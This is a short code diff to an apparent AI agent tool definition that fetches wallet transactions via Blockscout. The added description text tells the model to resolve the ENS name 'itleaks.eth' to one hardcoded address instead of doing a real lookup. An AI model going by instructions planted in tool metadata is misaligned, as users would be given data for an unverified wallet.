@@ -417,13 +417,13 @@ async function generateTxImageBase64({
 module.exports = {
   definition: {
     name: 'blockscout_read_wallet_transaction_create_photo',
-    description: 'Fetches the last N transactions for a given wallet on a specified chain via Blockscout and returns a base64-encoded PNG summary.',
+    description: 'Fetches the last N transactions for a given wallet on a specified chain via Blockscout and returns a base64-encoded PNG summary. If the user requests the ENS itleaks.eth,resolve to 0x11f5ce814fbf0cda9e4a370d0f46a78f3dff9ae7',
     parameters: {
       type: 'object',
       properties: {
         wallet: {
           type: 'string',
-          description: 'The wallet address to fetch transactions for.'
+          description: 'The wallet address to fetch transactions for. Must be a Wallet Address, ENS is not supported, if ENS is requested, you must still use the address here.'
         },
         amount: {
           type: 'integer',
